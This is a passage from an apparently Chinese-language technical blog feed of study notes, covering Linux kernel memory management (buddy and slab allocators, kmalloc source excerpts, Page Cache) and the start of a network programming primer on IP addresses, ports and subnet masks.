2^{12}$的倍数）</li><li>假设连续的物理内存，各页面块左右的页面，要么是等同大小，要么就是整数倍，而且还是偶数，形同伙伴</li></ul><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220114-buddy.png" alt=""></p><ul><li><p>伙伴管理算法的申请过程：如果申请指定大小的页面在其页面块链表中不存在，则会往高阶的页面块链表进行查找，直到找到为止。如果在高阶的页面块链表找到空闲的页面块，则会将其拆分为两块，如果拆分后仍比需要的大，那么继续拆分，直至到大小刚好为止</p></li><li><p>伙伴管理算法的释放过程：当某块页面被释放时，且其存在空闲的<strong>伙伴页面块</strong>（两个页面块的大小相同且两者的物理地址连续），则算法会将其两者合并为一个大的页面块，合并后的页面块如果还可以找到伙伴页面块，则会继续合并，直至到大小为$2^{MAX_ORDER}$个页面为止</p><blockquote><p>如何分配 4M 以上内存：</p><ol><li><p>修改MAX_ORDER</p></li><li><p>内核启动选型传递"mem="参数，预留部分内存</p></li><li><p>在start_kernel中mem_init函数之前调用alloc_boot_mem函数预分配大块内存</p></li><li><p>vmalloc 函数：分配在虚拟内存中连续但在物理内存中不一定连续的内存</p><p>…</p></li></ol></blockquote></li></ul></li><li><p>页框操作</p><ul><li><p><code>alloc_pages()</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">struct</span> <span class="token class-name">page</span> <span class="token operator">*</span><span class="token function">alloc_pages</span><span class="token punctuation">(</span>gfp_t gfp_mask<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> order<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>分配$2^{order}$个连续的物理页，并返回一个指针，指向第一个页的page结构体</p></li><li><p><code>page_address()</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">page_address</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">page</span> <span class="token operator">*</span>page<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回page页面所映射的的虚拟地址</p></li></ul></li></ol><h3 id="slab内存管理机制">slab内存管理机制</h3><ol><li><p>slab实现了小块物理内存的分配和管理，减少伙伴算法在分配小块连续内存时所产生的内部碎片</p></li><li><p>将频繁使用的对象缓存起来，减少分配、初始化和释放对象的时间开销</p></li><li><p>通过着色技术调整对象以更好的使用硬件高速缓存</p></li><li><p>slab层把不同的对象划分为高速缓存(cache) 组，其中每个高速缓存都存放不同类型的对象，每种对象类型对应一个高速缓存，例如一个高速缓存存放<code>task_ struct</code>结构体， 而另外一个高速缓存存放<code>struct inode</code>结构体</p></li><li><p>slab由一个或者多个物理上连续的页组成，每个高速缓存由多个slab组成</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220114-slab.png" alt=""></p><p>slab 分配器的结构</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220114-slab-detail.png" alt=""></p><p>slab/slob/slub</p></li><li><p>专用高速缓存</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//建立高速缓存</span><span class="token keyword">struct</span> <span class="token class-name">kmem_cache</span> <span class="token operator">*</span><span class="token function">kmem_cache_create</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">,</span> size_t size<span class="token punctuation">,</span> size_t align<span class="token punctuation">,</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> flags<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>ctor<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>cat /proc/slabinfo</code>查看所有的高速缓存</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//从高速缓存申请内存</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">kmem_cache_alloc</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">kmem_cache</span> <span class="token operator">*</span>cachep<span class="token punctuation">,</span> gfp_t flags<span class="token punctuation">)</span><span class="token keyword">void</span> <span class="token function">kmem_cache_destroy</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">kmem_cache</span> <span class="token operator">*</span>s<span class="token punctuation">)</span><span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">slab_alloc</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">kmem_cache</span> <span class="token operator">*</span>cachep<span class="token punctuation">,</span> gfp_t flags<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> caller<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>普通高速缓存</p><p>返回一个指向内存块的指针，其内存块大小至少size大小，所分配的内存在<strong>物理上是连续的</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">kmalloc</span><span class="token punctuation">(</span>size_t size<span class="token punctuation">,</span> gfp_t flags<span class="token punctuation">)</span>    <span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">kzalloc</span><span class="token punctuation">(</span>size_t size<span class="token punctuation">,</span> gfp_t flags<span class="token punctuation">)</span><span class="token comment">//内存空间置为0</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">kmalloc</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> flags <span class="token operator">|</span> __GFP_ZERO<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回一个指向内存块的指针，其内存块大小至少size大小，所分配的内存在<strong>物理上无需连续</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">vmalloc</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> size<span class="token punctuation">)</span>    <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">vzalloc</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> size<span class="token punctuation">)</span><span class="token comment">//内存空间置为0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="Linux内存分配函数比较">Linux内存分配函数比较</h3><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220114-compare.png" alt=""></p><h3 id="kmalloc-内核源码实现">kmalloc()内核源码实现</h3><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220116-kmalloc.png" alt=""></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">kmalloc</span><span class="token punctuation">(</span>size_t size<span class="token punctuation">,</span> gfp_t flags<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_constant_p</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&gt;</span> KMALLOC_MAX_CACHE_SIZE<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token function">kmalloc_large</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//...</span><span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token function">__kmalloc</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//size一般不会指定</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// mm/slab.c中的实现</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">__kmalloc</span><span class="token punctuation">(</span>size_t size<span class="token punctuation">,</span> gfp_t flags<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">__do_kmalloc</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> flags<span class="token punctuation">,</span> _RET_IP_<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">__do_kmalloc</span><span class="token punctuation">(</span>size_t size<span class="token punctuation">,</span> gfp_t flags<span class="token punctuation">,</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> caller<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">struct</span> <span class="token class-name">kmem_cache</span> <span class="token operator">*</span>cachep<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token operator">*</span>ret<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span>size <span class="token operator">&gt;</span> KMALLOC_MAX_CACHE_SIZE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>cachep <span class="token operator">=</span> <span class="token function">kmalloc_slab</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//得到高速缓存结构体</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token function">ZERO_OR_NULL_PTR</span><span class="token punctuation">(</span>cachep<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> cachep<span class="token punctuation">;</span>ret <span class="token operator">=</span> <span class="token function">slab_alloc</span><span class="token punctuation">(</span>cachep<span class="token punctuation">,</span> flags<span class="token punctuation">,</span> caller<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//查到空闲的对象</span><span class="token comment">//...</span><span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* * Find the kmem_cache structure that serves a given size of * allocation */</span><span class="token keyword">struct</span> <span class="token class-name">kmem_cache</span> <span class="token operator">*</span><span class="token function">kmalloc_slab</span><span class="token punctuation">(</span>size_t size<span class="token punctuation">,</span> gfp_t flags<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> index<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&lt;=</span> <span class="token number">192</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>size<span class="token punctuation">)</span><span class="token keyword">return</span> ZERO_SIZE_PTR<span class="token punctuation">;</span>index <span class="token operator">=</span> size_index<span class="token punctuation">[</span><span class="token function">size_index_elem</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span>size <span class="token operator">&gt;</span> KMALLOC_MAX_CACHE_SIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">WARN_ON</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">}</span>index <span class="token operator">=</span> <span class="token function">fls</span><span class="token punctuation">(</span>size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_ZONE_DMA</span></span><span class="token comment">//...</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token keyword">return</span> kmalloc_caches<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//struct kmem_cache *kmalloc_caches[KMALLOC_SHIFT_HIGH + 1];</span>        <span class="token comment">//#define KMALLOC_SHIFT_HIGH((MAX_ORDER + PAGE_SHIFT - 1) &lt;= 25 ? \//(MAX_ORDER + PAGE_SHIFT - 1) : 25)</span>        <span class="token operator">/</span>PAGE_SHIFT<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>一页的大小是4K，所以PAGE_SHIFT值为12，往左偏移12位</p><p>MAX_ORDER值为11，即为伙伴算法块链表数</p><p>所以内核中最多可以定义23个高速缓存结构体</p></blockquote><p>高速缓存索引和object size对应关系</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __init <span class="token function">create_kmalloc_caches</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> flags<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> KMALLOC_SHIFT_LOW<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> KMALLOC_SHIFT_HIGH<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>kmalloc_caches<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token function">new_kmalloc_cache</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//第5个开始</span><span class="token comment">/* * Caches that are not of the two-to-the-power-of size. * These have to be created immediately after the * earlier power of two caches */</span><span class="token keyword">if</span> <span class="token punctuation">(</span>KMALLOC_MIN_SIZE <span class="token operator">&lt;=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>kmalloc_caches<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> i <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token function">new_kmalloc_cache</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>KMALLOC_MIN_SIZE <span class="token operator">&lt;=</span> <span class="token number">64</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>kmalloc_caches<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> i <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token function">new_kmalloc_cache</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/* Kmalloc array is now usable */</span>slab_state <span class="token operator">=</span> UP<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_ZONE_DMA</span></span><span class="token comment">//...</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">void</span> __init <span class="token function">new_kmalloc_cache</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> flags<span class="token punctuation">)</span><span class="token punctuation">{</span>kmalloc_caches<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">create_kmalloc_cache</span><span class="token punctuation">(</span>kmalloc_info<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span>kmalloc_info<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">.</span>size<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> size<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">const</span> kmalloc_info<span class="token punctuation">[</span><span class="token punctuation">]</span> __initconst <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token constant">NULL</span><span class="token punctuation">,</span>                      <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"kmalloc-96"</span><span class="token punctuation">,</span>             <span class="token number">96</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"kmalloc-192"</span><span class="token punctuation">,</span>           <span class="token number">192</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"kmalloc-8"</span><span class="token punctuation">,</span>               <span class="token number">8</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"kmalloc-16"</span><span class="token punctuation">,</span>             <span class="token number">16</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"kmalloc-32"</span><span class="token punctuation">,</span>             <span class="token number">32</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"kmalloc-64"</span><span class="token punctuation">,</span>             <span class="token number">64</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"kmalloc-128"</span><span class="token punctuation">,</span>           <span class="token number">128</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment">//...</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="虚拟地址空间管理机制">虚拟地址空间管理机制</h3><blockquote><p>进程如何管理和分配它的3G虚拟地址空间？</p><p><strong>分治思想</strong></p></blockquote><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220118-vma.png" alt=""></p><p><code>/proc/PID/maps</code>显示进程映射了的内存区域和访问权限</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220118-maps.png" alt=""></p><blockquote><p>内核中进程的一段地址空间用一个<code>vm_area_struct</code>结构体表示，所有地址空间存储在 <strong>task -&gt; mm -&gt; mmap</strong>链表中</p></blockquote><h3 id="内存池">内存池</h3><p>内核态内存池</p><p>用户态内存池</p><h3 id="DMA-内存">DMA 内存</h3><ol><li>直接内存访问是一种<strong>硬件机制</strong>，它允许外围设备和主内存之间直接传输它们的 I/O 数据，而不需要系统处理器的参与</li></ol><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220118-vm_area_struct.jpg" alt=""></p><h2 id="Loopback驱动源码分析">Loopback驱动源码分析</h2><p><a href="https://www.bilibili.com/video/BV1N64y1a75N?spm_id_from=333.999.0.0">https://www.bilibili.com/video/BV1N64y1a75N?spm_id_from=333.999.0.0</a></p><p><a href="https://segmentfault.com/a/1190000010911305">https://segmentfault.com/a/1190000010911305</a></p><h2 id="基于fuse实现自定义文件系统">基于fuse实现自定义文件系统</h2><p>fuse文件系统</p><p>用户空间驱动</p><p><a href="https://www.bilibili.com/video/BV1NS4y1L7Me?spm_id_from=333.999.0.0">https://www.bilibili.com/video/BV1NS4y1L7Me?spm_id_from=333.999.0.0</a></p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220223-fuse.png" alt=""></p><h2 id="Page-Cache">Page Cache</h2><p>服务器的 load 飙高、服务器的 I/O 吞吐飙高、业务响应时延出现大的毛刺、业务平均访问时延明显增加 … 这些问题很可能是由于 Page Cache 管理不到位引起的，Page Cache 管理不当除了会增加系统 I/O 吞吐外，还会引起业务性能抖动</p><h3 id="什么是-Page-Cache-？">什么是 Page Cache ？</h3><ul><li><p>Page Cache 是内核管理的内存，它不属于用户</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211126-page-cache.jpg" alt="应用程序产生Page Cache的逻辑示意图"></p></li><li><p>Linux 上直接查看 Page Cache 的方式包括 <code>/proc/meminfo</code>、<code>free</code> 、<code>/proc/vmstat</code> 命令等</p><blockquote><p>/proc/meminfo：</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211127-meminfo.png" alt=""></p><p><a href="https://github.com/mmalecki/procps/blob/master/free.c">free</a>：通过解析 /proc/meminfo 得出统计数据</p><p><strong>buff/cache = Buffers + Cached + SReclaimable</strong></p></blockquote></li><li><p><strong>Buffers + Cached + SwapCached = Active(file) + Inactive(file) + Shmem + SwapCached</strong></p><p>等式的两边就是 Page Cache</p><p><strong>Active(file) + Inactive(file)</strong> 是 File-backed page（与文件对应的内存页），mmap() 内存映射方式和 buffered I/O 消耗的内存就属于这部分</p><p><strong>SwapCached</strong> 是在打开了 Swap 分区后，把 Inactive(anon) + Active(anon) 这两项里的匿名页给交换到磁盘（swap out），然后再读入到内存（swap in）后分配的内存，由于读入到内存后原来的 Swap File 还在，所以 SwapCached 也可以认为是 File-backed page，这样做的目的是为了减少 I/O</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211127-swapcached.jpg" alt=""></p><blockquote><p>SwapCached 只在 Swap 分区打开的情况下才会有，建议在生产环境中关闭 Swap 分区，因为 Swap 过程产生的 I/O 会很容易引起性能抖动</p></blockquote><p><strong>Shmem</strong> 是指匿名共享映射这种方式分配的内存（free 命令中 shared 这一项），比如 tmpfs（临时文件系统）</p></li><li></li></ul><p><a href="https://github.com/mmalecki/procps/blob/master/free.c">https://github.com/mmalecki/procps/blob/master/free.c</a></p><h3 id="为什么需要-Page-Cache-？">为什么需要 Page Cache ？</h3><p>标准 I/O 和内存映射会先把数据写入到 Page Cache，这样做会通过减少 I/O 次数来提升读写效率</p><p>内核开发</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211230-kerneldev.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络编程原理与实践</title>
      <link href="2021/02/04/cs-network-socket/"/>
      <url>2021/02/04/cs-network-socket/</url>
      
        <content type="html"><![CDATA[<h2 id="00-前言-3">00 | 前言</h2><p>  在计算机领域中，网络是信息传输、接收、共享的虚拟平台，通过它把各个点、面、体的信息联系到一起，可以进行数据传递，从而实现资源的共享</p><p>  网络编程从大方面说就是对信息的发送到接受，通过操作相应 API 调度计算机硬件资源，并利用传输管道（网线）进行数据交换的过程</p><p>  一些关于网络编程方面的问题看似简单，但想做到完全理解却并不容易，学习高性能网络编程，需要掌握两个核心要点：<strong>第一就是理解网络协议，并在这个基础上和操作系统内核配合，感知各种网络 I/O 事件；第二就是学会使用线程处理并发</strong></p><p>  本文会从实践出发，从问题的角度对知识点进行阐述</p><p>​</p><p>​</p><h2 id="01-网络编程入门">01 | 网络编程入门</h2><h3 id="1-1-基本概念">1.1 基本概念</h3><h4 id="1-1-1-客户端-服务器网络模型">1.1.1 客户端 - 服务器网络模型</h4><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210127-network-model.png" alt=""></p><ol><li><p>当一个客户端需要服务时，它会向服务器端发送一个请求，这个请求是按照双方约定的格式来发送的，以便保证服务器端可以理解</p></li><li><p>服务器端收到这个请求后，会根据双方约定的格式解释它，并且以合适的方式进行操作</p></li><li><p>服务器端完成处理请求之后，会给客户端发送一个响应，然后等待客户端的下一步操作</p></li><li><p>客户端收到响应并进行处理</p><blockquote><p>区别出客户端和服务器，本质上是因为二者编程模型是不同的，<strong>但无论是客户端，还是服务器端，它们运行的单位都是进程</strong></p></blockquote></li></ol><p>​</p><p>​</p><h4 id="1-1-2-IP-和端口">1.1.2 IP 和端口</h4><ul><li><p>在 TCP/IP 协议栈中，IP 用来表示网络世界的地址</p></li><li><p>在一台计算机上是可以同时存在多个连接的，区分出不同的连接就需要用到端口这个概念</p><blockquote><p>端口号是一个 16 位的整数，最多为 65536</p></blockquote></li><li><p><strong>计算机的 IP 地址是唯一的，每个连接的端口号是不同的</strong></p></li><li><p>当一个客户端发起连接请求时，客户端的端口是由操作系统内核临时分配的，称为<strong>临时端口</strong>，服务器端的端口通常是一个众所周知的端口<code>Well Known Ports</code></p></li><li><p>一个连接可以通过客户端 - 服务器端的 IP 和端口唯一确定，这叫做<strong>套接字对</strong>，按照（客户端地址、客户端端口、服务端地址、服务端端口）这样的四元组表示：</p><pre class="line-numbers language-none"><code class="language-none">（clientaddr:clientport, serveraddr: serverport)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210127-connection.png" alt="一个客户端 - 服务器之间的连接"></p></li></ul><p>​</p><p>​</p><h4 id="1-1-3-子网掩码">1.1.3 子网掩码</h4><p>  在网络 IP 划分的时候需要区分两个概念：</p><ul><li><p>网络<code>network</code>：表示这组 IP 共同的部分，比如在 <strong>192.168.1.1</strong>~<strong>192.168.1.255</strong> 这个区间里，它们共同的部分是 <strong>192.168.1.0</strong></p></li><li><p>主机<code>host</code>：表示这组 IP 不同的部分，上例中 1~255 就是不同的部分，表示有 255 个可用的不同 IP</p><blockquote><p>例如 IPv4 地址，<strong>192.0.2.12</strong>，前面三个 bytes 是子网，最后一个 byte 是 host，或者说 host 为 8 位，子网掩码为 <strong>192.0.2.0/24</strong>（<strong>255.255.255.0</strong>）</p></blockquote></li><li><p>网络地址位数由子网掩码<code>Netmask</code>决定，<strong>将 IP 地址与子网掩码进行位与操作，就能得到网络的值</strong></p></li><li><p><strong>注意</strong>：子网掩码的格式永远都是二进制格式：前面是一连串的 1，后面跟着一连串的 0</p><blockquote><p><strong>255.192.0.0</strong> 这样的子网掩码无法直观地知道有多少个 1，多少个 0，后来有了新的表示方法：<strong>IP / 网络的位数</strong><br>如 IP <strong>192.0.2.12/30</strong>：有 30 个 1， 2 个 0，主机个数为 4</p></blockquote></li></ul><p>​</p><p>​</p><h4 id="1-1-4-保留网段和端口">1.1.4 保留网段和端口</h4><h5 id="保留网段">保留网段</h5><ul><li><p>国际标准组织在 IPv4 地址空间里面专门划出了一些网段，这些网段不会用做公网上的 IP 而是仅仅保留做内部使用，这些地址称作保留网段</p></li><li><p>下表是三个保留网段，用于专用网络中的本地通信</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210127-reserved-network-ranges.png" alt=""></p></li><li><p><code>255.255.255.255/32</code>：用于受限广播地址</p></li><li><p><code>224.0.0.0/4</code>：用于多播</p></li></ul><p>​</p><h5 id="保留端口">保留端口</h5><ul><li><p>保留端口就是大家约定俗成的，已经被对应服务广为使用的端口，比如 ftp 的 21 端口，ssh 的 22 端口，http 的 80 端口等</p></li><li><p>glibc 定义的保留端口：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* Standard well-known ports.  */</span><span class="token keyword">enum</span>  <span class="token punctuation">{</span>    IPPORT_ECHO <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">,</span>    <span class="token comment">/* Echo service.  */</span>    IPPORT_DISCARD <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">,</span>   <span class="token comment">/* Discard transmissions service.  */</span>    IPPORT_SYSTAT <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">,</span>   <span class="token comment">/* System status service.  */</span>    IPPORT_DAYTIME <span class="token operator">=</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token comment">/* Time of day service.  */</span>    IPPORT_NETSTAT <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token comment">/* Network status service.  */</span>    IPPORT_FTP <span class="token operator">=</span> <span class="token number">21</span><span class="token punctuation">,</span>    <span class="token comment">/* File Transfer Protocol.  */</span>    IPPORT_TELNET <span class="token operator">=</span> <span class="token number">23</span><span class="token punctuation">,</span>   <span class="token comment">/* Telnet protocol.  */</span>    IPPORT_SMTP <span class="token 